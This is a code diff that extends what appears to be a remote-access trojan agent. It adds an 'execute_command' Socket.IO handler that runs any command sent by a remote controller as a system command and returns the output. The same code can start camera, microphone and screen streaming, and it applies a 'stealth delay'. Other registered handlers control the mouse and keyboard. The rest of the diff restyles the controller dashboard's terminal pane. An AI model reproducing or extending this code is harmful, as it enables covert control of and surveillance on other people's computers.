@@ -5964,6 +5964,7 @@ def register_socketio_handlers():
     
     # Register other handlers
     sio.on('command')(on_command)
+    sio.on('execute_command')(on_execute_command)  # For controller UI v2.1
     sio.on('mouse_move')(on_mouse_move)
     sio.on('mouse_click')(on_mouse_click)
     sio.on('key_press')(on_remote_key_press)
@@ -8192,16 +8193,32 @@ DASHBOARD_HTML = '''
         }
 
         .command-output {
-            background: #000;
-            color: var(--accent-green);
+            background: #0a0a0a;
+            color: #00ff88;
             padding: 15px;
             border-radius: 8px;
             font-family: 'Courier New', monospace;
-            font-size: 0.8rem;
-            height: 150px;
+            font-size: 0.85rem;
+            height: 200px;
             overflow-y: auto;
             margin-top: 15px;
-            border: 1px solid var(--border-color);
+            border: 1px solid var(--accent-blue);
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            line-height: 1.4;
+        }
+        
+        .command-output::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        .command-output::-webkit-scrollbar-track {
+            background: #0a0a0a;
+        }
+        
+        .command-output::-webkit-scrollbar-thumb {
+            background: var(--accent-blue);
+            border-radius: 4px;
         }
 
         .status-indicator {
@@ -8390,13 +8407,26 @@ DASHBOARD_HTML = '''
                 return;
             }
             
+            // Display the command in the output first
+            displayCommandInput(command);
+            
             sendCommand(command);
             commandInput.value = '';
         }
 
+        function displayCommandInput(command) {
+            const commandOutput = document.getElementById('command-output');
+            const timestamp = new Date().toLocaleTimeString();
+            commandOutput.innerHTML += `<span style="color: #00ff88;">[${timestamp}] > ${command}</span>\\n`;
+            commandOutput.scrollTop = commandOutput.scrollHeight;
+        }
+
         function displayCommandResult(output) {
             const commandOutput = document.getElementById('command-output');
-            commandOutput.innerHTML += output + '\\n';
+            const timestamp = new Date().toLocaleTimeString();
+            // Escape HTML and preserve formatting
+            const escapedOutput = output.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+            commandOutput.innerHTML += `<span style="color: #ffffff;">[${timestamp}] ${escapedOutput}</span>\\n\\n`;
             commandOutput.scrollTop = commandOutput.scrollHeight;
         }
 
@@ -8839,6 +8869,64 @@ def on_command(data):
     
     if output:
         sio.emit('command_result', {'agent_id': agent_id, 'output': output})
+
+def on_execute_command(data):
+    """
+    Handle execute_command event from controller UI v2.1
+    This is separate from on_command to support the new UI terminal
+    """
+    if not SOCKETIO_AVAILABLE or sio is None:
+        log_message("Socket.IO not available, cannot handle execute_command", "warning")
+        return
+    
+    agent_id = data.get('agent_id')
+    command = data.get('command')
+    
+    # Verify this command is for us
+    our_agent_id = get_or_create_agent_id()
+    if agent_id != our_agent_id:
+        return  # Not for this agent
+    
+    log_message(f"[EXECUTE_COMMAND] Received: {command}")
+    
+    # Execute the command using the same logic as on_command
+    output = ""
+    
+    # Add stealth delay
+    sleep_random_non_blocking()
+    
+    internal_commands = {
+        "start-stream": lambda: start_streaming(our_agent_id),
+        "stop-stream": stop_streaming,
+        "start-audio": lambda: start_audio_streaming(our_agent_id),
+        "stop-audio": stop_audio_streaming,
+        "start-camera": lambda: start_camera_streaming(our_agent_id),
+        "stop-camera": stop_camera_streaming,
+        "screenshot": lambda: "Screenshot captured",
+        "systeminfo": lambda: execute_command("systeminfo" if WINDOWS_AVAILABLE else "uname -a"),
+    }
+    
+    if command in internal_commands:
+        try:
+            output = internal_commands[command]()
+            if output is None:
+                output = f"Command '{command}' executed successfully"
+        except Exception as e:
+            output = f"Error executing '{command}': {e}"
+    else:
+        # Execute as system command
+        try:
+            output = execute_command(command)
+        except Exception as e:
+            output = f"Command execution error: {e}"
+    
+    # Send output back to controller
+    log_message(f"[EXECUTE_COMMAND] Sending output ({len(output)} chars)")
+    sio.emit('command_result', {
+        'agent_id': our_agent_id,
+        'output': output,
+        'timestamp': time.time()
+    })
 
 def on_mouse_move(data):
     if not SOCKETIO_AVAILABLE or sio is None:
